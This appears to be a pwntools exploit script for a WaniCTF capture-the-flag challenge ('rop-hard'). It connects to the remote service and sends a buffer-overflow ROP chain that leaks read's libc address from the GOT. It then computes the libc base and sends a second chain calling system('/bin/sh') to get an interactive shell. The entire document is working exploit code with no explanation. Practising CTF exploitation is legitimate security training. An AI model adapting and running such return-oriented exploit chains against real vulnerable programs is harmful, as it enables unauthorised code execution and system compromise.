from pwn import *

DEBUG = False

IP = "rop-hard.pwn.wanictf.org"
PORT = 9006
BINPATH = "./pwn06"

if DEBUG:
    context.log_level = "DEBUG"
    p = process(BINPATH)
else:
    #context.log_level = "DEBUG"
    p = remote(IP, PORT)

def main():
    p.recvuntil(">")

def hex_send(v):
    p.sendline("1")
    p.sendlineafter(":", hex(v))

puts_plt = 0x4010D0
read_plt = 0x401080
read_got = 0x404028
prdir = 0x401283
prsirr = 0x401281 
set_rax = 0x401184
syscall = 0x401176

buf_addr = int(p.recvline().split()[-1],16)
p.recvline()

payload = "%s\0\0\0\0\0\0" + "a" * (cyclic(0x10000).find(p64(0x6161617461616173)) - 16)
payload += p64(buf_addr)
payload += p64(prdir)
payload += p64(buf_addr)
payload += p64(prsirr)
payload += p64(read_got)
payload += p64(0xdeadbeef)
payload += p64(0x0401070)
payload += p64(prdir)
payload += p64(0)
payload += p64(prsirr)
payload += p64(buf_addr + 0x50)
payload += p64(0xdeadbeef)
payload += p64(0x4011F7)


if DEBUG:
    gdb.attach(p)

p.sendline(payload)
read_addr = u64(p.recv(8).ljust(8, "\0"))
libc_base = read_addr - 		0x110140

system_addr = libc_base + 0x04f550
binsh_addr = libc_base + 0x1b3e1a

if DEBUG:
  libc_base = read_addr - 0x110180
  system_addr = libc_base + 0x04f4e0
  binsh_addr = libc_base + 0x1b40fa

print("[+] libc base : 0x%x"%libc_base)

payload = "a" * cyclic(0x1000).find(p64(0x6361616863616167))
payload += p64(prdir)
payload += p64(binsh_addr)
payload += p64(system_addr)
p.sendline(payload)
p.interactive() 
